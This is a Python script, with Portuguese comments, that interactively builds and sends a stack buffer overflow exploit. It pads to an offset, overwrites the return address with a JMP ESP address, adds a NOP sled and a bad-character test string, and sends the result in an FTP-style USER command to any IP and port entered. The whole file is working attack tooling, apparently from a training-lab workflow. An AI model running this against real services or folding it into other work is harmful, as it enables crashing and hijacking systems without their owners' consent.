#!/usr/bin/python3
import socket
from struct import pack

# Lista original de bad characters
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

def remove_badchars(badchars, found_badchars):
    """
    Remove os bad characters encontrados da lista original.
    """
    for char in found_badchars:
        badchars = badchars.replace(bytes.fromhex(char[2:]), b"")
    return badchars

def construir_buffer(offset, jmp_esp, filtered_badchars):
    """
    Função para construir o buffer com base no offset, endereço JMP ESP e badchars filtrados.
    """
    overflow = b"A" * offset
    retn = pack("<L", int(jmp_esp, 16))  # Converter o endereço para Little Endian
    padding = b"\x90" * 16  # NOP sled
    
    # Construindo o buffer final
    buffer = overflow + retn + padding + filtered_badchars
    return buffer

def enviar_exploit(ip, porta, buffer):
    """
    Função para enviar o buffer ao alvo.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)

        print(f"[+] Conectando-se a {ip}:{porta}...")
        s.connect((ip, porta))

        # Recebendo o banner (se disponível)
        banner = s.recv(1024)
        print(f"[+] Banner recebido: {banner.decode('utf-8', 'ignore')}")

        # Enviando o buffer
        print("[+] Enviando buffer...")
        s.sendall(b"USER " + buffer + b"\r\n")
        print("[+] Buffer enviado com sucesso!")
        s.close()

    except socket.error as err:
        print(f"[!] Erro ao conectar-se ao {ip}:{porta} - {err}")
    except Exception as e:
        print(f"[!] Erro inesperado: {e}")

def main():
    print("=== Exploit de Buffer Overflow ===")
    
    # Solicitar o IP e a porta do usuário
    ip = input("Digite o IP de destino: ").strip()
    try:
        porta = int(input("Digite a porta de destino: ").strip())
    except ValueError:
        print("[!] Porta inválida.")
        return

    # Solicitar o offset do usuário
    try:
        offset = int(input("\nDigite o valor do offset: ").strip())
    except ValueError:
        print("[!] Offset inválido.")
        return

    # Solicitar o endereço JMP ESP
    jmp_esp = input("\nDigite o endereço JMP ESP (formato: 0x12345678): ").strip()
    if not jmp_esp.startswith("0x"):
        print("[!] Formato de endereço inválido. Use o formato 0x12345678.")
        return

    # Solicitar bad characters encontrados (opcional)
    found_badchars = input("\nDigite os bad characters encontrados (ex: \\x00\\x0a\\x0d) ou pressione Enter se não houver: ").strip()
    
    # Remover os bad characters informados da lista original
    if found_badchars:
        found_badchars_list = found_badchars.split("\\x")[1:]
        found_badchars_list = [f"\\x{char}" for char in found_badchars_list]
        filtered_badchars = remove_badchars(badchars, found_badchars_list)
    else:
        filtered_badchars = badchars

    print(f"\n[+] Bad characters utilizados:\n{filtered_badchars}")
    
    # Construir o buffer com base nas entradas
    buffer = construir_buffer(offset, jmp_esp, filtered_badchars)
    
    # Enviar o exploit
    enviar_exploit(ip, porta, buffer)

if __name__ == "__main__":
    main()
